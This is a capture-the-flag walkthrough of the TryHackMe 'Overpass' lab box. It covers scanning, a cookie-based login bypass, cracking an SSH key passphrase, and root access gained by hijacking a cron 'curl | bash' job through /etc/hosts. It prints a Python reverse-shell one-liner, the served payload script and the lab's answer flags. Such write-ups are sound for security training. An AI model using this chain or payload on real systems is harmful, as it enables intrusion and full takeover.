# Task 1 Overpass
----

>>What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

>>There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

>>UPDATE: The code is now claimed.
>>The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.

## SCANNING :

```bash
root@ip-10-10-76-219:~# nmap -sC -sV 10.10.222.176

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-06 13:17 GMT
Nmap scan report for ip-10-10-222-176.eu-west-1.compute.internal (10.10.222.176)
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (EdDSA)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
MAC Address: 02:E8:75:B0:B8:37 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
```
```bash
root@ip-10-10-76-219:~# gobuster dir -u http://10.10.222.176 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.222.176
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/01/06 13:19:23 Starting gobuster
===============================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
===============================================================
2022/01/06 13:19:58 Finished
===============================================================
```

## GETTING CREDS :

>>By the source there else statement when the cookie is "SessionToken=anything" let the user in.So we used curl to do this.

```bash
root@ip-10-10-76-219:~# curl "http://10.10.222.176/admin/" --cookie "SessionToken=anything"
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Overpass</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="/css/main.css">
    <link rel="icon" 
      type="image/png" 
      href="/img/overpass.png" />
    <script src="/main.js"></script>
</head>

<body>
    <nav>
        <img class="logo" src="/img/overpass.svg" alt="Overpass logo">
        <h2 class="navTitle"><a href="/">Overpass</a></h2>
        <a href="/aboutus">About Us</a>
        <a href="/downloads">Downloads</a>
    </nav>
    <h1 class="pageHeading content">Welcome to the Overpass Administrator area</h1>
    <h3 class="subtitle content">A secure password manager with support for Windows, Linux, MacOS and more</h3>
    <div class="bodyFlexContainer content">
        <div>
            <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p>
            <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.<br>
                Also, we really need to talk about this "Military Grade" encryption. - Paradox</p>
            <pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----</pre>
        </div>
    </div>
</body>
</html>

```

## CRACKING THE CREDS :

>>To get the passphrase we need to 'john' first use ssh2john output it into file then john to crack it down.
```bash
root@ip-10-10-76-219:~# /opt/john/ssh2john.py id_rsa > forjohn.txt
root@ip-10-10-76-219:~# ls
Desktop      id_rsa         Pictures  Scripts
Downloads    Instructions   Postman   thinclient_drives
forjohn.txt  overpassLinux  Rooms     Tools

root@ip-10-10-76-219:/opt/john# ./john --wordlist=/usr/share/wordlists/rockyou.txt /root/forjohn.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)
1g 0:00:00:10 DONE (2022-01-06 13:50) 0.09165g/s 1314Kp/s 1314Kc/s 1314KC/s *7¡Vamos!
Session completed. 
```

>>Using ssh to login to the machine.
>>cat the user.txt for the flag and todo.txt to get the info.
>>If we do 'ls -la' there is hidden file '.overpass' which has rot47 encoded password for the user james.
>>Decode the hash to get the james password. 

## SSH TO TARGET :

```bash
root@ip-10-10-76-219:~# ssh -i id_rsa james@10.10.222.176 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Thu Jan  6 13:51:47 UTC 2022
  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.222.176
  Swap usage:   0%
47 packages can be updated.
0 updates are security updates.
Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1

james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

james@overpass-prod:~$ ls -la
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```
```txt
Encoded with ROT47 : #~%cf :D E96 62D:6DE 2?5 J6E A@H6C7F= 4:A96CP #~%cf 32D:42==J >2<6D E6IE F?C62523=6 2?5 5@6D ?@E C6BF:C6 255E:@?2= DA246]

Decoded : [{"name":"System","pass":"saydrawnlyingpicture"}]
```
## PRIVILEGE ESCALATION :

>>Checking for any escalation with the usera james but nothing.
>>Using linpeas.sh to check for the escalation point.

```bash
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.

james@overpass-prod:~$ wget http://10.10.76.219:8000/linpeas.sh
--2022-01-06 14:01:14--  http://10.10.76.219:8000/linpeas.sh
Connecting to 10.10.76.219:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 233380 (228K) [text/x-sh]
Saving to: \u2018linpeas.sh\u2019
linpeas.sh        100%[==========>] 227.91K  --.-KB/s    in 0.002s  
2022-01-06 14:01:14 (106 MB/s) - \u2018linpeas.sh\u2019 saved [233380/233380]

james@overpass-prod:~$ ls
linpeas.sh  todo.txt  user.txt
james@overpass-prod:~$ ./linpeas.sh
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

>>With linpeas we found a found that overpass.thm is points on the localhost(127.0.0.1).We can able to edit that to point that to our own machine ip.
>>And seeing the crontab there is a way to get the reverse shell as root after redirecting the overpass.thm to our machine. 

```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ nano /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.10.76.219 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ ping overpass.thm 
PING overpass.thm (10.10.76.219) 56(84) bytes of data.
64 bytes from overpass.thm (10.10.76.219): icmp_seq=1 ttl=64 time=0.345 ms
```

>>At our local machine make directory 'mkdir -p /downloads/src' and touch a buildscript.sh to replicate that curl we found from the crontab.
>>In the buildscript.sh we use the python reverse shell. 
>>Serving it from our machine using python local server.
>>Since we are connected to target with overpass.thm.Open another window and create a netcat listener on the you specified on the reverse shell.
>>It will make connection and root shell is obtained.

```bash
root@ip-10-10-76-219:~# mkdir downloads
root@ip-10-10-76-219:~# cd downloads/
root@ip-10-10-76-219:~/downloads# mkdir src
root@ip-10-10-76-219:~/downloads# cd src
root@ip-10-10-76-219:~/downloads/src# touch buildscript.sh
root@ip-10-10-76-219:~/downloads/src# cat buildscript.sh 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.76.219",7007));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

root@ip-10-10-76-219:~/# sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.222.176 - - [19/Aug/2020 17:06:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

root@ip-10-10-76-219:~/downloads/src# nc -lvnp 7007
listening on [any] 7007 ...
connect to [10.10.222.176] from (UNKNOWN) [10.10.76.219] 57212
/bin/sh: 0: can't access tty; job control turned off
# cd /root
# ls
buildStatus
builds
go
root.txt
src
# cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
```

----

# ANSWER THE FOLLOWING :
----

1.Hack the machine and get the flag in user.txt
>>thm{65c1aaf000506e56996822c6281e6bf7}

2.Escalate your privileges and get the flag in root.txt
>>thm{7f336f8c359dbac18d54fdd64ea753bb}

----